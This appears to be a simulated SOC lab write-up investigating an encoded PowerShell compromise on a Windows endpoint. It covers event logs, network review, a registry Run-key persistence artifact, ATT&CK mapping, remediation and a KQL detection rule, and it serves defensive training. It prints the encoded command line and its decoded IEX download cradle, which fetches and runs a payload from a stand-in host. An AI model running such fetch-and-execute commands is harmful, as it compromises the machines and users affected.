Windows Endpoint PowerShell Compromise Investigation Lab

Overview

This project simulates the detection and full investigation of a malicious PowerShell execution on a Windows 10 endpoint.

The objective was to determine whether the activity was malicious, identify persistence mechanisms, map techniques to MITRE ATT&CK, and recommend containment actions.

This lab mirrors a real SOC investigation workflow using Windows Security Event Logs and PowerShell logging.

Scenario

A high severity alert was triggered after PowerShell executed with a Base64 encoded command.

Initial telemetry indicated:

Event ID 4688 – New process created
Process: powershell.exe
Command Line contained: -enc (encoded command)
Suspicious outbound network activity shortly after execution

The investigation aimed to determine:

• What the encoded command executed
• Whether persistence was established
• If command and control communication occurred
• Impact and recommended remediation

Initial Alert Details

Event ID: 4688
Parent Process: explorer.exe
New Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Command Line:

powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHMAaQB0AGUALgBjAG8AbQAvAHAAaABwAC4AZQB4AGUAIgApAA==

Encoded commands combined with ExecutionPolicy Bypass are strong indicators of malicious execution.

Analysis Steps

Step 1 – Decode PowerShell Command

Decoded payload revealed:

IEX (New-Object Net.WebClient).DownloadString("http://malicious-site.com/php.exe")

This confirms the script attempted to download and execute a remote payload.

Step 2 – Network Activity Review

Windows Firewall log indicated outbound connection to:

Destination IP: 185.234.219.12
Port: 80
Domain: malicious-site.com

This behavior aligns with command and control communication or payload retrieval.

Step 3 – Persistence Investigation

Registry analysis revealed a new Run key:

HKCU\Software\Microsoft\Windows\CurrentVersion\Run
Value Name: Updater
Data: C:\Users\Public\php.exe

This indicates persistence via registry autorun.

Step 4 – Process Tree Review

Process chain observed:

explorer.exe
  └── powershell.exe
        └── php.exe

This confirms payload execution.

MITRE ATT&CK Mapping

T1059.001 – Command and Scripting Interpreter: PowerShell
T1105 – Ingress Tool Transfer
T1547.001 – Registry Run Keys / Startup Folder
T1055 – Process Injection (potential follow-on activity)

Findings

Confirmed malicious PowerShell execution using encoded command.
Remote payload downloaded and executed.
Persistence established via registry Run key.
Outbound communication to suspicious external host.

This activity is consistent with initial access followed by persistence establishment.

Risk Assessment

Level: Critical

Justification:

• Encoded PowerShell with execution policy bypass
• External payload retrieval
• Persistence mechanism established
• Potential for lateral movement

False Positive Considerations

• Administrative automation script using encoded commands
• Software installer using PowerShell
• Legitimate remote management tools

However, execution policy bypass combined with external payload download and registry persistence makes this highly malicious.

Remediation Recommendations

• Immediately isolate affected host
• Remove malicious Run key
• Delete payload from C:\Users\Public
• Block malicious-site.com and associated IP
• Reset affected user credentials
• Perform full EDR sweep across environment
• Review for lateral movement indicators

Detection Logic Proposal

Alert when:

Event ID = 4688
AND Process Name = powershell.exe
AND CommandLine contains "-enc"
AND ExecutionPolicy Bypass present

Escalate severity if:

Outbound connection occurs within 60 seconds of execution.

Example KQL (Microsoft Sentinel)

SecurityEvent
| where EventID == 4688
| where Process has "powershell"
| where CommandLine contains "-enc"
| where CommandLine contains "ExecutionPolicy Bypass"

Skills Demonstrated

Windows Event Log analysis
PowerShell attack investigation
Encoded payload decoding
Persistence detection
MITRE ATT&CK mapping
Incident documentation
Microsoft Sentinel detection logic
Threat hunting methodology

Evidence

event_logs_sample.txt – Simulated Security Event entries
registry_artifacts.txt – Persistence evidence
process_tree.png – Process relationship visual
incident_report.md – Full documented investigation

Outcome

Malicious PowerShell-based compromise confirmed.
Host required immediate containment and remediation.
Detection logic created to improve future response time.

Lessons Learned

Encoded PowerShell commands are a common initial execution method.
ExecutionPolicy Bypass combined with -enc is high risk.
Registry Run keys remain a common persistence technique.
Correlating process creation with network activity increases detection confidence.

Analyst Reasoning

While PowerShell usage alone is not inherently malicious, the combination of encoded commands, execution policy bypass, external payload download, and registry persistence significantly increases malicious probability.

Given the telemetry correlation and behavior chain, this incident would be escalated as a confirmed compromise.
